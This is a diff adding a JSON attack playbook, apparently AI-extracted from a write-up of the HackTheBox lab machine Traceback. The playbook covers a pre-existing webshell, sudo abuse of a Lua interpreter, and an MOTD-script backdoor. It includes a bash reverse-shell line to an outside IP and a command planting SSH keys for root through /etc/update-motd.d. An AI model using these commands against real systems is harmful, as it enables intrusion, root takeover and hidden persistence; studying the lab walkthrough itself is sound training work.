@@ -1,0 +1,845 @@
+{
+  "writeup_id": "Htb_Traceback",
+  "scenario_fingerprint": {
+    "scenario_name": "linux_webshell_privilege_escalation",
+    "primary_services": [
+      "http",
+      "ssh"
+    ],
+    "port_signature": "22+80",
+    "service_combination": "ssh+apache",
+    "os_family": "linux_ubuntu",
+    "environment_type": "web_server",
+    "entry_vector": "existing_webshell",
+    "privilege_path": "webshell_to_sudo_interpreter_to_motd_persistence",
+    "attack_complexity": "easy",
+    "estimated_time": "30-45 minutes",
+    "scenario_confidence": 0.9,
+    "distinguishing_factors": [
+      "pre_existing_webshell",
+      "sudo_lua_interpreter",
+      "motd_write_permissions",
+      "github_webshell_research"
+    ],
+    "environmental_clues": [
+      "defaced_website",
+      "html_comment_hints",
+      "default_webshell_credentials",
+      "ubuntu_18_04_fingerprint"
+    ],
+    "similar_scenarios": [
+      "beep_htb_easy",
+      "shocker_htb_easy"
+    ],
+    "unique_aspects": [
+      "luvit_lua_interpreter",
+      "motd_privilege_escalation",
+      "webshell_enumeration_via_osint"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "webshell_discovery",
+        "success_reason": "Attacker left webshell with default credentials and provided hint in HTML comment",
+        "prerequisite_indicators": [
+          "web_server_accessible",
+          "html_comments_present",
+          "defacement_message_visible"
+        ],
+        "recognition_patterns": [
+          "HTML comment mentioning webshells",
+          "defacement page with attacker signature",
+          "Google search reveals webshell repository"
+        ],
+        "failure_modes": [
+          "webshell_removed_or_renamed",
+          "credentials_changed",
+          "web_server_hardened"
+        ],
+        "environmental_factors": [
+          "already_compromised_system",
+          "attacker_left_backdoor",
+          "default_webshell_credentials"
+        ],
+        "success_probability": 0.95,
+        "typical_timeframe": "10-20 minutes"
+      },
+      {
+        "technique": "sudo_privilege_escalation",
+        "success_reason": "webadmin user could run luvit as sysadmin without password",
+        "prerequisite_indicators": [
+          "sudo_permissions_available",
+          "scripting_interpreter_accessible",
+          "target_user_home_writable"
+        ],
+        "recognition_patterns": [
+          "sudo -l shows NOPASSWD entries",
+          "interpreter allows file operations",
+          "can write to .ssh/authorized_keys"
+        ],
+        "failure_modes": [
+          "no_sudo_permissions",
+          "interpreter_sandboxed",
+          "ssh_keys_disabled"
+        ],
+        "environmental_factors": [
+          "misconfigured_sudo_permissions",
+          "lua_interpreter_with_file_access",
+          "ssh_key_authentication_enabled"
+        ],
+        "success_probability": 0.92,
+        "typical_timeframe": "5-10 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "HTML comment about webshells",
+        "discovery_method": "view-source inspection",
+        "why_critical": "Provided direct hint to find backdoor webshell",
+        "how_to_recognize": [
+          "HTML comments in defacement pages",
+          "attacker signatures or messages",
+          "references to tools or techniques"
+        ],
+        "follow_up_actions": [
+          "google_search_comment_text",
+          "create_wordlist_from_results",
+          "directory_bruteforce_webshells"
+        ]
+      },
+      {
+        "discovery": "smevk.php webshell with default credentials",
+        "discovery_method": "gobuster with custom wordlist",
+        "why_critical": "Provided initial foothold with web execution",
+        "how_to_recognize": [
+          "webshell login pages",
+          "default credentials in source",
+          "admin/admin login patterns"
+        ],
+        "follow_up_actions": [
+          "test_default_credentials",
+          "establish_reverse_shell",
+          "add_ssh_keys_for_persistence"
+        ]
+      },
+      {
+        "discovery": "sudo luvit permissions",
+        "discovery_method": "sudo -l enumeration",
+        "why_critical": "Allowed privilege escalation to sysadmin user",
+        "how_to_recognize": [
+          "NOPASSWD sudo entries",
+          "scripting interpreters in sudo",
+          "file system access capabilities"
+        ],
+        "follow_up_actions": [
+          "test_interpreter_file_operations",
+          "write_ssh_authorized_keys",
+          "establish_ssh_access"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "webadmin_user",
+        "escalation_method": "sudo_luvit_to_sysadmin",
+        "why_possible": "Sudo allowed running Lua interpreter as sysadmin with file write access",
+        "recognition_signs": [
+          "sudo_nopasswd_interpreter",
+          "lua_file_io_capabilities",
+          "ssh_directory_accessible"
+        ],
+        "exploitation_path": "sudo luvit → write authorized_keys → SSH as sysadmin"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 22,80 open on Linux host with Apache webserver",
+        "decision": "Enumerate web application for vulnerabilities and hidden content",
+        "reasoning": "Limited attack surface suggests web app is primary entry point",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "ssh_enumeration",
+            "when": "if web fails"
+          },
+          {
+            "option": "version_exploits",
+            "when": "if outdated services found"
+          }
+        ],
+        "success_indicators": [
+          "hidden_directories_found",
+          "webshell_discovered",
+          "source_code_comments"
+        ],
+        "next_decision": "analyze_web_content"
+      },
+      {
+        "step": 2,
+        "situation": "Found HTML comment mentioning webshells",
+        "decision": "Research comment text to find webshell wordlist",
+        "reasoning": "Specific comment suggests existing webshell rather than uploading new one",
+        "confidence": 0.95,
+        "prerequisites": [
+          "html_comment_found"
+        ],
+        "success_indicators": [
+          "github_repository_found",
+          "webshell_list_obtained"
+        ],
+        "failure_fallbacks": [
+          "directory_bruteforce",
+          "common_webshell_names"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Webshell found with default credentials",
+        "decision": "Check source code for default login credentials",
+        "reasoning": "Many webshells use hardcoded default credentials",
+        "confidence": 0.85,
+        "prerequisites": [
+          "webshell_accessible"
+        ],
+        "success_indicators": [
+          "credentials_in_source",
+          "successful_authentication"
+        ],
+        "failure_fallbacks": [
+          "credential_bruteforce",
+          "webshell_exploit"
+        ]
+      },
+      {
+        "step": 4,
+        "situation": "Shell access obtained as webadmin user",
+        "decision": "Check sudo privileges and look for privilege escalation vectors",
+        "reasoning": "Standard Linux privilege escalation methodology",
+        "confidence": 0.9,
+        "prerequisites": [
+          "user_shell_obtained"
+        ],
+        "success_indicators": [
+          "sudo_permissions_found",
+          "suid_binaries",
+          "writable_files"
+        ],
+        "failure_fallbacks": [
+          "kernel_exploits",
+          "service_enumeration",
+          "cron_jobs"
+        ]
+      },
+      {
+        "step": 5,
+        "situation": "Found sudo access to luvit (Lua interpreter) as sysadmin",
+        "decision": "Use Lua script to write SSH key to sysadmin authorized_keys",
+        "reasoning": "Lua interpreter allows file operations and SSH key provides persistent access",
+        "confidence": 0.95,
+        "prerequisites": [
+          "sudo_luvit_access",
+          "lua_knowledge"
+        ],
+        "success_indicators": [
+          "ssh_key_written",
+          "ssh_access_obtained"
+        ],
+        "failure_fallbacks": [
+          "reverse_shell_lua",
+          "file_read_lua"
+        ]
+      },
+      {
+        "step": 6,
+        "situation": "Access as sysadmin user obtained",
+        "decision": "Run process monitoring to identify automated tasks",
+        "reasoning": "Custom welcome message suggests system modifications and potential cron jobs",
+        "confidence": 0.8,
+        "prerequisites": [
+          "sysadmin_access"
+        ],
+        "success_indicators": [
+          "cron_jobs_identified",
+          "root_processes_found"
+        ],
+        "failure_fallbacks": [
+          "manual_enumeration",
+          "file_permissions_check"
+        ]
+      },
+      {
+        "step": 7,
+        "situation": "Found cron job restoring /etc/update-motd.d/ files",
+        "decision": "Check write permissions on MOTD files for privilege escalation",
+        "reasoning": "MOTD scripts run as root on user login, writable files = root code execution",
+        "confidence": 0.95,
+        "prerequisites": [
+          "motd_cron_identified"
+        ],
+        "success_indicators": [
+          "motd_files_writable",
+          "sysadmin_group_access"
+        ],
+        "failure_fallbacks": [
+          "other_root_processes",
+          "kernel_exploits"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_webshell_found": {
+        "action": "attempt_default_credentials",
+        "tools": [
+          "browser",
+          "source_view"
+        ],
+        "next_phase": "establish_shell_access"
+      },
+      "if_sudo_interpreter_found": {
+        "action": "use_interpreter_for_privilege_escalation",
+        "alternatives": [
+          "ssh_key_injection",
+          "reverse_shell",
+          "file_operations"
+        ],
+        "decision_criteria": "based_on_interpreter_capabilities"
+      },
+      "if_motd_writable": {
+        "action": "inject_payload_and_trigger_login",
+        "purpose": "execute_code_as_root",
+        "tools": [
+          "ssh",
+          "reverse_shell_payload"
+        ]
+      },
+      "if_cron_cleanup_detected": {
+        "action": "time_payload_injection_between_cleanups",
+        "reasoning": "exploit_window_between_cron_runs",
+        "timing": "monitor_process_schedule"
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "research_specific_comments_and_hints",
+        "reasoning": "targeted_research_more_effective_than_generic_enumeration",
+        "applicability": "when_specific_clues_found"
+      },
+      {
+        "rule": "check_interpreter_sudo_access_for_file_operations",
+        "reasoning": "interpreters_often_allow_file_system_access",
+        "applicability": "python_lua_ruby_node_access"
+      },
+      {
+        "rule": "monitor_processes_when_custom_modifications_detected",
+        "reasoning": "custom_changes_often_indicate_automation",
+        "applicability": "modified_system_messages_or_files"
+      },
+      {
+        "rule": "prioritize_motd_and_login_scripts_when_writable",
+        "reasoning": "guaranteed_root_execution_on_user_login",
+        "applicability": "writable_system_startup_scripts"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "Web Shell Discovery",
+        "mitre_id": "T1505.003",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "web_server_accessible",
+          "directory_enumeration_possible",
+          "php_enabled"
+        ],
+        "success_indicators": [
+          "webshell_files_found",
+          "login_page_accessible",
+          "command_execution_available"
+        ],
+        "incompatible_with": [
+          "web_server_disabled",
+          "strict_file_permissions",
+          "web_application_firewall"
+        ],
+        "confidence_boosters": [
+          "common_webshell_names",
+          "github_wordlists_available",
+          "default_credentials_work"
+        ],
+        "typical_success_rate": 0.65,
+        "estimated_time": "10-30 minutes"
+      },
+      {
+        "technique": "Sudo Privilege Escalation",
+        "mitre_id": "T1548.003",
+        "required_services": [
+          "ssh"
+        ],
+        "required_ports": [
+          22
+        ],
+        "os_requirements": [
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "sudo_configured",
+          "user_has_sudo_rights",
+          "interpreter_available"
+        ],
+        "success_indicators": [
+          "sudo_l_shows_permissions",
+          "interpreter_execution_allowed",
+          "command_injection_possible"
+        ],
+        "incompatible_with": [
+          "sudo_disabled",
+          "restricted_shell",
+          "interpreter_sandboxed"
+        ],
+        "confidence_boosters": [
+          "scripting_language_interpreters",
+          "nopasswd_sudo_entries",
+          "development_tools_installed"
+        ],
+        "typical_success_rate": 0.85,
+        "estimated_time": "5-15 minutes"
+      },
+      {
+        "technique": "MOTD Privilege Escalation",
+        "mitre_id": "T1053.006",
+        "required_services": [
+          "ssh"
+        ],
+        "required_ports": [
+          22
+        ],
+        "os_requirements": [
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "motd_directory_writable",
+          "scripts_executed_as_root",
+          "user_login_triggers_execution"
+        ],
+        "success_indicators": [
+          "write_access_to_motd",
+          "script_execution_on_login",
+          "root_privileges_obtained"
+        ],
+        "incompatible_with": [
+          "motd_directory_protected",
+          "script_execution_disabled",
+          "file_permissions_strict"
+        ],
+        "confidence_boosters": [
+          "update_motd_directory_exists",
+          "cron_cleanup_scripts_present",
+          "ubuntu_default_configuration"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "10-20 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "web_server": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443,
+          8000
+        ],
+        "service_indicators": [
+          "http",
+          "https",
+          "apache",
+          "nginx"
+        ],
+        "banner_indicators": [
+          "Apache",
+          "nginx",
+          "IIS"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "linux_system": {
+        "port_indicators": [
+          22
+        ],
+        "service_indicators": [
+          "ssh",
+          "OpenSSH"
+        ],
+        "banner_indicators": [
+          "Ubuntu",
+          "OpenSSH"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "compromised_system": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http"
+        ],
+        "banner_indicators": [
+          "owned",
+          "backdoor",
+          "webshell"
+        ],
+        "confidence_threshold": 0.95
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "webshell_discovery",
+          "when": "web_server_detected_and_compromise_indicators",
+          "reason": "immediate_command_execution_capability"
+        },
+        {
+          "attack": "sudo_enumeration",
+          "when": "linux_shell_access_obtained",
+          "reason": "common_misconfiguration_high_success_rate"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "motd_privilege_escalation",
+          "when": "ubuntu_system_detected_and_file_write_access",
+          "reason": "reliable_but_requires_specific_conditions"
+        },
+        {
+          "attack": "directory_enumeration",
+          "when": "web_server_accessible",
+          "reason": "reveals_hidden_files_and_directories"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "Web Shell Discovery via OSINT",
+        "mitre_id": "T1505.003",
+        "category": "persistence",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "gobuster",
+            "command_template": "gobuster dir -u {target_url} -w {wordlist}",
+            "actual_command": "gobuster dir -u http://10.10.10.181 -w php_shells.txt",
+            "output_pattern": "/{shell_name} (Status: 200)",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "web_server_accessible",
+          "webshell_wordlist_available",
+          "html_comment_hints_present"
+        ],
+        "success_indicators": [
+          "webshell_login_page_found",
+          "default_credentials_accepted",
+          "command_execution_available"
+        ],
+        "common_failures": [
+          "webshell_removed_or_renamed",
+          "default_credentials_changed",
+          "wordlist_incomplete"
+        ],
+        "follow_up_techniques": [
+          "reverse_shell_execution",
+          "ssh_key_installation",
+          "local_enumeration"
+        ],
+        "time_investment": "10-20 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Sudo Privilege Escalation via Lua Interpreter",
+        "mitre_id": "T1548.003",
+        "category": "privilege_escalation",
+        "phase": "privilege_escalation",
+        "tools_used": [
+          {
+            "name": "luvit",
+            "command_template": "sudo -u {target_user} /home/{current_user}/luvit {lua_script}",
+            "actual_command": "sudo -u sysadmin /home/sysadmin/luvit /dev/shm/.0xdf.lua",
+            "output_pattern": "silent_execution_success",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          }
+        ],
+        "prerequisites": [
+          "sudo_nopasswd_configured",
+          "lua_interpreter_accessible",
+          "target_user_home_writable"
+        ],
+        "success_indicators": [
+          "lua_script_executes_without_error",
+          "ssh_key_written_successfully",
+          "authentication_as_target_user_works"
+        ],
+        "common_failures": [
+          "lua_syntax_errors",
+          "file_permission_issues",
+          "ssh_directory_missing"
+        ],
+        "follow_up_techniques": [
+          "ssh_authentication",
+          "further_enumeration",
+          "cron_job_discovery"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "MOTD Script Privilege Escalation",
+        "mitre_id": "T1053.003",
+        "category": "privilege_escalation",
+        "phase": "privilege_escalation",
+        "tools_used": [
+          {
+            "name": "echo",
+            "command_template": "echo '{malicious_command}' >> /etc/update-motd.d/{script_name}",
+            "actual_command": "echo 'cp /home/sysadmin/.ssh/authorized_keys /root/.ssh/' >> 00-header",
+            "output_pattern": "command_appended_to_script",
+            "effectiveness_rating": 5,
+            "reliability": 0.9
+          },
+          {
+            "name": "pspy",
+            "command_template": "./pspy64",
+            "actual_command": "./pspy64",
+            "success_factors": [
+              "cron_job_detection",
+              "process_monitoring"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "motd_scripts_writable_by_user",
+          "ssh_login_triggers_motd_execution",
+          "cron_cleanup_timing_known"
+        ],
+        "success_indicators": [
+          "malicious_code_added_to_motd_script",
+          "ssh_login_triggers_execution",
+          "root_access_obtained"
+        ],
+        "common_failures": [
+          "cron_cleanup_too_frequent",
+          "motd_scripts_not_writable",
+          "timing_window_missed"
+        ],
+        "follow_up_techniques": [
+          "ssh_key_persistence",
+          "system_enumeration",
+          "log_cleanup"
+        ],
+        "time_investment": "15-30 minutes",
+        "skill_level": "intermediate"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "pspy",
+        "use_case": "cron_job_discovery",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "privilege_escalation_enumeration"
+        ],
+        "alternatives": [
+          "manual_cron_inspection",
+          "process_monitoring"
+        ],
+        "best_practices": [
+          "run_for_several_minutes_to_catch_periodic_jobs",
+          "focus_on_root_owned_processes",
+          "correlate_with_file_permissions"
+        ]
+      },
+      {
+        "tool": "gobuster",
+        "use_case": "webshell_discovery",
+        "effectiveness_rating": 4,
+        "reliability": 0.85,
+        "learning_curve": "low",
+        "essential_for": [
+          "web_application_enumeration"
+        ],
+        "alternatives": [
+          "dirb",
+          "ffuf",
+          "manual_testing"
+        ],
+        "best_practices": [
+          "use_targeted_wordlists_when_hints_available",
+          "combine_with_osint_research",
+          "check_common_webshell_names"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "webshell_to_root_escalation",
+        "steps": [
+          {
+            "step": 1,
+            "command": "gobuster dir -u http://10.10.10.181 -w php_shells.txt",
+            "purpose": "Discover webshell using targeted wordlist",
+            "expected_output": "/smevk.php (Status: 200)"
+          },
+          {
+            "step": 2,
+            "command": "Login with admin:admin to webshell",
+            "purpose": "Access webshell interface",
+            "expected_output": "Webshell control panel"
+          },
+          {
+            "step": 3,
+            "command": "bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'",
+            "purpose": "Execute reverse shell",
+            "expected_output": "Shell as webadmin user"
+          },
+          {
+            "step": 4,
+            "command": "sudo -u sysadmin /home/sysadmin/luvit /dev/shm/.0xdf.lua",
+            "purpose": "Execute Lua script to install SSH key",
+            "expected_output": "SSH key written to sysadmin authorized_keys"
+          },
+          {
+            "step": 5,
+            "command": "echo 'cp /home/sysadmin/.ssh/authorized_keys /root/.ssh/' >> /etc/update-motd.d/00-header",
+            "purpose": "Modify MOTD script for privilege escalation",
+            "expected_output": "Command appended to MOTD script"
+          },
+          {
+            "step": 6,
+            "command": "ssh -i ~/keys/id_rsa_generated root@10.10.10.181",
+            "purpose": "Trigger MOTD execution and gain root",
+            "expected_output": "Root shell access"
+          }
+        ],
+        "success_rate": 0.92,
+        "typical_duration": "30-60 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Traceback",
+      "difficulty": "Easy",
+      "os": "Linux Ubuntu 18.04",
+      "platform": "HackTheBox",
+      "release_date": "2020-03-14",
+      "author": "Xh4H",
+      "estimated_time": "30-45 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "low",
+      "skill_level_required": "beginner",
+      "primary_attack_vectors": [
+        "webshell_discovery",
+        "sudo_abuse",
+        "motd_backdoor"
+      ],
+      "key_vulnerabilities": [
+        "existing_webshell",
+        "sudo_misconfiguration",
+        "writable_motd"
+      ],
+      "environment_type": "compromised_web_server",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "webshell_identification",
+        "lua_exploitation",
+        "persistence_techniques"
+      ],
+      "prerequisite_knowledge": [
+        "basic_web_enumeration",
+        "linux_fundamentals",
+        "sudo_concepts"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_exploitation",
+      "subcategories": [
+        "privilege_escalation",
+        "persistence"
+      ],
+      "attack_types": [
+        "initial_access",
+        "privilege_escalation",
+        "persistence"
+      ],
+      "defensive_lessons": [
+        "webshell_detection",
+        "sudo_hardening",
+        "motd_security"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Shocker",
+        "Bashed",
+        "Nineveh"
+      ],
+      "similarity_reasons": [
+        "web_initial_access",
+        "sudo_escalation",
+        "linux_privilege_escalation"
+      ],
+      "unique_aspects": [
+        "pre_existing_webshell",
+        "lua_interpreter_abuse",
+        "motd_persistence"
+      ],
+      "difficulty_factors": [
+        "straightforward_enumeration",
+        "well_known_techniques",
+        "clear_attack_path"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T01:04:37.624328",
+    "original_file": "0xdf_writeups/Htb Traceback.md",
+    "content_length": 17897,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 0.9166666666666667,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 0.6666666666666666,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
